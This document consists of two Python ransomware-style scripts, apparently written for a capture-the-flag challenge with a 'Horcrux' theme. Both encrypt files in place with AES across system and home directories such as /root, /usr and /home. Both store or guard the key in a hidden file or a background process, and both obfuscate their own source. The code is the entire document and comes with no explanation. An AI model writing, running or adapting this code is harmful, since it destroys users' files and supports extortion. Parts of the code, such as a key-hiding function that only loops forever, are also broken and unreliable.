import os
import sys
import base64
import random
import string
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.backends import default_backend
from multiprocessing import Process

def generate_key():
    salt = os.urandom(16)
    password = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password)
    return key, salt, password

def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()
    padder = PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    with open(file_path, "wb") as f:
        f.write(iv + encrypted_data)

def process_files(directories, excluded_files, key):
    for directory in directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    if file not in excluded_files:
                        encrypt_file(os.path.join(root, file), key)

def hide_key_file(key_file_path):
    while True:
        pass

def reverse_and_obfuscate_script(script_path):
    with open(script_path, "r") as f:
        script = f.read()
    reversed_script = script[::-1]
    shuffled = list(reversed_script)
    random.shuffle(shuffled)
    index_map = {i: shuffled.index(char) for i, char in enumerate(reversed_script)}
    obfuscated_script = "".join(shuffled)
    encoded_script = base64.b64encode(obfuscated_script.encode()).decode()
    with open(script_path, "w") as f:
        f.write(encoded_script + "-f{" + ",".join(map(str, index_map.values())) + "}")

def main():
    key, salt, password = generate_key()
    key_file_path = "keyfile"
    excluded_files = ["boot", "shell-config", "proc-config", key_file_path, sys.argv[0]]
    target_folders = ["/root", "/usr", "/home", "/Documents", "/Downloads", "/var/gui"]
    
    with open(key_file_path, "wb") as f:
        f.write(key)
    
    parent_process = Process(target=hide_key_file, args=(key_file_path,))
    parent_process.start()
    
    process_files(target_folders, excluded_files, key)
    reverse_and_obfuscate_script(sys.argv[0])
    
    with open("/tmp/.flag.txt", "w") as f:
        f.write("Challenge Completed")

if __name__ == "__main__":
    main()



```
import os
import random
import base64
import base62
import signal
import time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

USER_DIR = "/home/skywalker-341"  # update if needed

KEY_PATH = "/dev/shm/.horcrux_key"
RESTORE_PATH = "/tmp/.horcrux"

# AES Encryption (symmetric)
def encrypt_file(filepath, key):
    cipher = AES.new(key, AES.MODE_EAX)
    with open(filepath, 'rb') as f:
        plaintext = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    with open(filepath, 'wb') as f:
        f.write(cipher.nonce + tag + ciphertext)

# Traverse and encrypt all files in the user directory
def encrypt_directory(base_path, key):
    for root, dirs, files in os.walk(base_path):
        for file in files:
            try:
                full_path = os.path.join(root, file)
                encrypt_file(full_path, key)
            except Exception as e:
                print(f"[-] Failed to encrypt {full_path}: {e}")

# Create fake background "Horcrux" process that lives until killed
def horcrux_process():
    def signal_handler(sig, frame):
        print("[!] Horcrux process killed. Restoring key...")
        with open(KEY_PATH, 'rb') as f:
            key = f.read()
        with open(RESTORE_PATH, 'wb') as f:
            f.write(key)
        print(f"[+] Key restored to {RESTORE_PATH}")
        os._exit(0)

    signal.signal(signal.SIGTERM, signal_handler)
    print("[+] Horcrux key protector running. PID:", os.getpid())

    # Stay alive forever
    while True:
        time.sleep(1)

def spawn_horcrux_guard(key):
    # Save the key in RAM (dev/shm)
    with open(KEY_PATH, 'wb') as f:
        f.write(key)

    pid = os.fork()
    if pid == 0:
        # In child process: become Horcrux guardian
        os.setsid()
        os.execlp("python3", "python3", __file__, "--horcrux")
    else:
        print(f"[+] Spawned horcrux process with PID {pid}")

# Obfuscate malware script content (optional for later)
def obfuscate_script(script_path):
    with open(script_path, "r") as f:
        script = f.read()

    chars = list(script)
    indexes = list(range(len(chars)))
    random.shuffle(indexes)

    rearranged = ''.join(chars[i] for i in indexes)
    mapping_str = ','.join(map(str, indexes))
    final_payload = mapping_str + "||" + rearranged
    final_encoded = base62.encodebytes(final_payload.encode())

    with open("malware.obfuscated.b62", "wb") as out:
        out.write(final_encoded)

    print("[+] Malware script obfuscated and saved as Base62.")

# Entry point
if __name__ == "__main__":
    import sys

    # If launched with --horcrux flag, run the horcrux guardian
    if len(sys.argv) > 1 and sys.argv[1] == "--horcrux":
        horcrux_process()
        sys.exit(0)

    # Main malware logic
    print("[*] Starting Lord Voldemort Malware Encryption")

    # 1. Generate symmetric key
    key = get_random_bytes(16)

    # 2. Encrypt user directory
    encrypt_directory(USER_DIR, key)

    # 3. Spawn horcrux guard process to protect key
    spawn_horcrux_guard(key)

    print("[+] Encryption complete. Horcrux is guarding the key in RAM.")


```
